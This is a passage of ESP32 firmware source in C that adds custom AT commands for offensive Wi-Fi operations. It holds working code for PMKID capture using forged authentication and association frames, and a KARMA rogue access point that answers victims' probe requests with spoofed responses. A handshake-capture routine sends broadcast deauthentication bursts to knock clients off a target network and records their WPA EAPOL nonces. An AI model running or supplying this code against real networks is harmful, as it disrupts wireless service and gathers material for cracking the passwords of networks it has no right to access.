    memcpy(s_pmkid_target_bssid, bssid, 6);
    s_pmkid_captured = false;
    memset(s_pmkid_hex, 0, sizeof(s_pmkid_hex));

    /* Set promiscuous filter for data frames */
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA,
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(pmkid_promisc_cb);

    /* Send authentication frame */
    frame_len = build_auth_frame(frame, bssid);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, frame_len, false);
    vTaskDelay(pdMS_TO_TICKS(200));

    /* Send association request */
    frame_len = build_assoc_frame(frame, bssid);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, frame_len, false);

    /* Wait up to 15 seconds for PMKID capture */
    for (int i = 0; i < 150 && !s_pmkid_captured; i++) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    esp_wifi_set_promiscuous_rx_cb(NULL);

    if (s_pmkid_captured) {
        char bssid_fmt[18];
        format_mac(bssid, bssid_fmt);
        at_send_line("+M1PMKID:%s,%s\r\n", bssid_fmt, s_pmkid_hex);
        return ESP_AT_RESULT_CODE_OK;
    }

    return ESP_AT_RESULT_CODE_ERROR;
}

/* ------------------------------------------------------------------ */
/*  AT+M1KARMA=1,<channel> / AT+M1KARMA=0                            */
/* ------------------------------------------------------------------ */

static void build_probe_resp_frame(uint8_t *frame, int *frame_len,
                                     const uint8_t dest_mac[6],
                                     const char *ssid, uint8_t channel)
{
    int pos = 0;
    uint8_t mac[6];
    /* Random BSSID for the fake AP */
    for (int i = 0; i < 6; i++) {
        mac[i] = (uint8_t)(esp_random() & 0xFF);
    }
    mac[0] &= 0xFE;
    mac[0] |= 0x02;

    /* Frame control: type=0 (mgmt), subtype=5 (probe response) => 0x0050 */
    frame[pos++] = 0x50;
    frame[pos++] = 0x00;
    /* Duration */
    frame[pos++] = 0x00;
    frame[pos++] = 0x00;
    /* Address 1 = destination (requester) */
    memcpy(&frame[pos], dest_mac, 6); pos += 6;
    /* Address 2 = random BSSID */
    memcpy(&frame[pos], mac, 6); pos += 6;
    /* Address 3 = random BSSID */
    memcpy(&frame[pos], mac, 6); pos += 6;
    /* Sequence number */
    frame[pos++] = 0x00;
    frame[pos++] = 0x00;
    /* Timestamp (8 bytes) */
    uint64_t ts = (uint64_t)(xTaskGetTickCount() * portTICK_PERIOD_MS);
    memcpy(&frame[pos], &ts, 8); pos += 8;
    /* Beacon interval = 100 TUs */
    frame[pos++] = 0x64;
    frame[pos++] = 0x00;
    /* Capability: 0x0411 */
    frame[pos++] = 0x11;
    frame[pos++] = 0x04;
    /* SSID tag */
    uint8_t ssid_len = (uint8_t)strlen(ssid);
    frame[pos++] = 0x00;
    frame[pos++] = ssid_len;
    memcpy(&frame[pos], ssid, ssid_len); pos += ssid_len;
    /* Supported rates */
    frame[pos++] = 0x01;
    frame[pos++] = 0x08;
    frame[pos++] = 0x82;
    frame[pos++] = 0x84;
    frame[pos++] = 0x8B;
    frame[pos++] = 0x96;
    frame[pos++] = 0x0C;
    frame[pos++] = 0x12;
    frame[pos++] = 0x18;
    frame[pos++] = 0x24;
    /* DS Parameter Set */
    frame[pos++] = 0x03;
    frame[pos++] = 0x01;
    frame[pos++] = channel;

    *frame_len = pos;
}

static void karma_promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT || s_karma_stop_flag) return;

    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *payload = pkt->payload;
    uint16_t frame_ctrl = payload[0] | (payload[1] << 8);

    /* Management frame, subtype 4 = probe request */
    if ((frame_ctrl & 0x00F0) != 0x0040) return;

    /* Extract source MAC (addr2, offset 10) */
    uint8_t src_mac[6];
    memcpy(src_mac, &payload[10], 6);

    /* Parse SSID from tagged parameters */
    char ssid[33] = "";
    int pos = 24;
    int end = pkt->rx_ctrl.sig_len;
    while (pos + 2 <= end) {
        uint8_t tag_id = payload[pos];
        uint8_t tag_len = payload[pos + 1];
        if (pos + 2 + tag_len > end) break;
        if (tag_id == 0 && tag_len > 0 && tag_len <= 32) {
            memcpy(ssid, &payload[pos + 2], tag_len);
            ssid[tag_len] = '\0';
            break;
        }
        pos += 2 + tag_len;
    }

    /* Skip broadcast/empty SSID probes */
    if (ssid[0] == '\0') return;

    /* Send probe response matching the requested SSID */
    uint8_t frame[256];
    int frame_len;
    build_probe_resp_frame(frame, &frame_len, src_mac, ssid, s_monitor_channel);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, frame_len, false);

    /* Notify host */
    char mac_str[18];
    format_mac(src_mac, mac_str);
    at_send_line("+M1KARMA:%s,%s\r\n", mac_str, ssid);
}

static void karma_task_func(void *arg)
{
    /* Install promiscuous callback */
    esp_wifi_set_promiscuous_rx_cb(karma_promisc_cb);

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT,
    };
    esp_wifi_set_promiscuous_filter(&filter);

    while (!s_karma_stop_flag) {
        vTaskDelay(pdMS_TO_TICKS(500));
    }

    esp_wifi_set_promiscuous_rx_cb(NULL);
    s_karma_task_handle = NULL;
    vTaskDelete(NULL);
}

static uint8_t at_setup_cmd_m1karma(uint8_t para_num)
{
    int32_t enable = 0;

    if (esp_at_get_para_as_digit(0, &enable) != ESP_AT_PARA_PARSE_RESULT_OK) {
        return ESP_AT_RESULT_CODE_ERROR;
    }

    if (enable == 0) {
        stop_task(&s_karma_task_handle, &s_karma_stop_flag);
        esp_wifi_set_promiscuous_rx_cb(NULL);
        return ESP_AT_RESULT_CODE_OK;
    }

    if (enable == 1) {
        int32_t channel = 1;

        if (para_num >= 2) {
            if (esp_at_get_para_as_digit(1, &channel) != ESP_AT_PARA_PARSE_RESULT_OK ||
                channel < 1 || channel > 14) {
                return ESP_AT_RESULT_CODE_ERROR;
            }
        }

        if (!enter_monitor((uint8_t)channel)) {
            return ESP_AT_RESULT_CODE_ERROR;
        }

        stop_task(&s_karma_task_handle, &s_karma_stop_flag);

        s_karma_stop_flag = false;
        xTaskCreate(karma_task_func, "m1karma", 4096, NULL, 5,
                    &s_karma_task_handle);
        return ESP_AT_RESULT_CODE_OK;
    }

    return ESP_AT_RESULT_CODE_ERROR;
}

/* ------------------------------------------------------------------ */
/*  AT+M1HSCAP=<bssid>,<channel>,<deauth_count>                      */
/* ------------------------------------------------------------------ */

static uint8_t s_hscap_target_bssid[6];
static volatile int s_hscap_frame_count = 0;
#define MAX_HSCAP_FRAMES 4

/* EAPOL handshake capture storage */
typedef struct {
    int frame_num;
    int direction;     /* 0=AP->STA, 1=STA->AP */
    uint16_t key_info;
    uint64_t replay_counter;
    uint8_t nonce[32];
} hscap_frame_t;

static hscap_frame_t s_hscap_frames[MAX_HSCAP_FRAMES];

static void hscap_promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA || s_hscap_stop_flag) return;
    if (s_hscap_frame_count >= MAX_HSCAP_FRAMES) return;

    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *payload = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    if (len < 34) return;

    uint16_t fc = payload[0] | (payload[1] << 8);
    if ((fc & 0x000C) != 0x0008) return;  /* not data */

    /* Check BSSID involvement */
    uint8_t bssid[6];
    int direction;
    if ((fc & 0x0300) == 0x0100) {
        /* FromDS=1, ToDS=0: AP->STA. BSSID=addr2 */
        memcpy(bssid, &payload[10], 6);
        direction = 0;
    } else if ((fc & 0x0300) == 0x0200) {
        /* FromDS=0, ToDS=1: STA->AP. BSSID=addr1 */
        memcpy(bssid, &payload[4], 6);
        direction = 1;
    } else {
        return;
    }

    if (memcmp(bssid, s_hscap_target_bssid, 6) != 0) return;

    int hdr_len = 24;
    if ((fc & 0x0800) != 0) hdr_len += 2;  /* QoS */
    if (hdr_len + 8 > len) return;

    /* Check LLC/SNAP + EAPOL ethertype */
    if (payload[hdr_len] != 0xAA || payload[hdr_len+1] != 0xAA) return;
    if (payload[hdr_len+6] != 0x88 || payload[hdr_len+7] != 0x8E) return;

    int eapol_off = hdr_len + 8;
    if (eapol_off + 5 > len) return;

    uint8_t desc_type = payload[eapol_off + 4];
    if (desc_type != 0x02 && desc_type != 0xFE) return;

    /* We have an EAPOL-Key frame */
    if (eapol_off + 49 > len) return;  /* need nonce field */

    int idx = s_hscap_frame_count;
    s_hscap_frames[idx].frame_num = idx + 1;
    s_hscap_frames[idx].direction = direction;

    /* Key info at eapol_off + 5 (2 bytes, big-endian) */
    s_hscap_frames[idx].key_info =
        (uint16_t)((payload[eapol_off + 5] << 8) | payload[eapol_off + 6]);

    /* Replay counter at eapol_off + 9 (8 bytes) */
    uint64_t rc = 0;
    for (int i = 0; i < 8; i++) {
        rc = (rc << 8) | payload[eapol_off + 9 + i];
    }
    s_hscap_frames[idx].replay_counter = rc;

    /* Nonce at eapol_off + 17 (32 bytes) */
    memcpy(s_hscap_frames[idx].nonce, &payload[eapol_off + 17], 32);

    /* Report to host */
    char nonce_hex[65];
    for (int i = 0; i < 32; i++) {
        snprintf(&nonce_hex[i*2], 3, "%02x", s_hscap_frames[idx].nonce[i]);
    }
    at_send_line("+M1HSCAP:%d,%d,0x%04x,%llu,%s\r\n",
                 s_hscap_frames[idx].frame_num,
                 direction,
                 s_hscap_frames[idx].key_info,
                 (unsigned long long)rc,
                 nonce_hex);

    s_hscap_frame_count++;
}

static void hscap_task_func(void *arg)
{
    int32_t deauth_count = (int32_t)(intptr_t)arg;

    /* Set promiscuous filter for data frames */
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA,
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(hscap_promisc_cb);

    /* Send deauth burst to force client reconnection */
    if (deauth_count > 0) {
        uint8_t frame[DEAUTH_FRAME_LEN];
        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        for (int32_t i = 0; i < deauth_count && !s_hscap_stop_flag; i++) {
            build_deauth_frame(frame, broadcast, s_hscap_target_bssid, 7);
            esp_wifi_80211_tx(WIFI_IF_STA, frame, DEAUTH_FRAME_LEN, false);
            vTaskDelay(pdMS_TO_TICKS(100));
        }
    }

    /* Wait for handshake capture or timeout (30 sec) */
    TickType_t start = xTaskGetTickCount();
    while (!s_hscap_stop_flag && s_hscap_frame_count < MAX_HSCAP_FRAMES) {
        if ((xTaskGetTickCount() - start) >= pdMS_TO_TICKS(30000)) {
            break;
        }
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    esp_wifi_set_promiscuous_rx_cb(NULL);
    at_send_line("+M1HSCAP:DONE,%d\r\n", s_hscap_frame_count);

    s_hscap_task_handle = NULL;
    vTaskDelete(NULL);
}

static uint8_t at_setup_cmd_m1hscap(uint8_t para_num)
{
    uint8_t *bssid_str = NULL;
    int32_t channel = 0;
    int32_t deauth_count = 5;
    uint8_t bssid[6];

    if (para_num < 2) {
        return ESP_AT_RESULT_CODE_ERROR;
    }

    if (esp_at_get_para_as_str(0, &bssid_str) != ESP_AT_PARA_PARSE_RESULT_OK) {
        return ESP_AT_RESULT_CODE_ERROR;
    }
    if (!parse_mac((const char *)bssid_str, bssid)) {
        return ESP_AT_RESULT_CODE_ERROR;
    }

    if (esp_at_get_para_as_digit(1, &channel) != ESP_AT_PARA_PARSE_RESULT_OK ||
        channel < 1 || channel > 14) {
        return ESP_AT_RESULT_CODE_ERROR;
    }

    if (para_num >= 3) {
        if (esp_at_get_para_as_digit(2, &deauth_count) != ESP_AT_PARA_PARSE_RESULT_OK ||
            deauth_count < 0) {
            return ESP_AT_RESULT_CODE_ERROR;
        }
    }

    /* Enter monitor mode */
    if (!enter_monitor((uint8_t)channel)) {
        return ESP_AT_RESULT_CODE_ERROR;
    }

    stop_task(&s_hscap_task_handle, &s_hscap_stop_flag);

    memcpy(s_hscap_target_bssid, bssid, 6);
    s_hscap_frame_count = 0;
    s_hscap_stop_flag = false;

    xTaskCreate(hscap_task_func, "m1hscap", 4096,
                (void *)(intptr_t)deauth_count, 5, &s_hscap_task_handle);
    return ESP_AT_RESULT_CODE_OK;
}

/* ------------------------------------------------------------------ */
/*  Command registration table                                        */
/* ------------------------------------------------------------------ */

static const esp_at_cmd_struct s_wifi_cmd_list[] = {
    {"+M1WIFISTATS",  NULL, at_query_cmd_m1wifistats,  NULL, NULL},
    {"+M1MONITOR",   NULL, NULL, at_setup_cmd_m1monitor,  NULL},
    {"+M1DEAUTH",    NULL, NULL, at_setup_cmd_m1deauth,   NULL},
    {"+M1DEAUTHSTOP", NULL, NULL, NULL, at_exe_cmd_m1deauthstop},
    {"+M1BEACON",    NULL, NULL, at_setup_cmd_m1beacon,   NULL},
    {"+M1PROBE",     NULL, NULL, at_setup_cmd_m1probe,    NULL},
    {"+M1PMKID",     NULL, NULL, at_setup_cmd_m1pmkid,    NULL},
    {"+M1KARMA",     NULL, NULL, at_setup_cmd_m1karma,    NULL},
    {"+M1HSCAP",     NULL, NULL, at_setup_cmd_m1hscap,    NULL},
};

bool esp_at_custom_wifi_cmd_register(void)
{
    return esp_at_custom_cmd_array_regist(
        s_wifi_cmd_list,
        sizeof(s_wifi_cmd_list) / sizeof(s_wifi_cmd_list[0]));
}